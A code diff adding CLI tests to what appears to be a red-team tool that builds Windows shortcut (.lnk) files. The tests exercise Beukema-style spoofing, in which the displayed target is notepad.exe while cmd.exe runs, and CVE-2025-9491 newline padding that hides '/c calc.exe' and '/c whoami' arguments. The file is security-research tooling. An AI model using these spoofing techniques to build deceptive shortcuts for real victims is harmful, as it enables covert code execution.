@@ -708,3 +708,115 @@ class TestStompMotW:
             "invalid",
         )
         assert result.returncode != 0
+
+
+# ---- Beukema LNK spoofing CLI tests ----
+# Reference: https://www.wietzebeukema.nl/blog/trust-me-im-a-shortcut
+
+
+class TestEnvTargetAnsi:
+    """CLI tests for --env-target-ansi (Beukema Variant 4)."""
+
+    def test_env_target_ansi_roundtrip(self, tmp_path):
+        out = tmp_path / "v4.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\notepad.exe",
+            "--env-target-ansi",
+            r"C:\Windows\System32\cmd.exe",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["env_target_ansi"] == r"C:\Windows\System32\cmd.exe"
+        assert data["env_target_unicode"] == ""
+
+
+class TestEnvTargetUnicode:
+    """CLI tests for --env-target-unicode."""
+
+    def test_env_target_unicode_roundtrip(self, tmp_path):
+        out = tmp_path / "unienv.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\notepad.exe",
+            "--env-target-unicode",
+            r"C:\Windows\System32\cmd.exe",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["env_target_ansi"] == ""
+        assert data["env_target_unicode"] == r"C:\Windows\System32\cmd.exe"
+
+
+class TestNullEnvBlockCLI:
+    """CLI tests for --null-env-block (Beukema Variant 1)."""
+
+    def test_null_env_block_roundtrip(self, tmp_path):
+        out = tmp_path / "v1.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\cmd.exe",
+            "--null-env-block",
+            "--arguments",
+            "/c whoami",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["env_target_ansi"] == ""
+        assert data["env_target_unicode"] == ""
+        assert data["arguments"] == "/c whoami"
+
+
+class TestForceAnsiCLI:
+    """CLI tests for --force-ansi."""
+
+    def test_force_ansi_roundtrip(self, tmp_path):
+        out = tmp_path / "ansi.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\notepad.exe",
+            "--force-ansi",
+            "--arguments",
+            "/c whoami",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"] == "/c whoami"
+        # IsUnicode (bit 7 = 0x80) must NOT be set
+        assert not (data["flags"] & 0x80)
+
+
+class TestPadCharCLI:
+    """CLI tests for --pad-char (CVE-2025-9491)."""
+
+    def test_pad_char_lfcr(self, tmp_path):
+        out = tmp_path / "cve.lnk"
+        result = run_cli(
+            "build",
+            r"C:\Windows\System32\cmd.exe",
+            "--arguments",
+            "/c calc.exe",
+            "--pad-args",
+            "256",
+            "--pad-char",
+            "\\n\\r",
+            "-o",
+            str(out),
+        )
+        assert result.returncode == 0
+        result = run_cli("parse", "--json", str(out))
+        data = json.loads(result.stdout)
+        assert data["arguments"].startswith("\n\r")
+        assert data["arguments"].endswith("/c calc.exe")
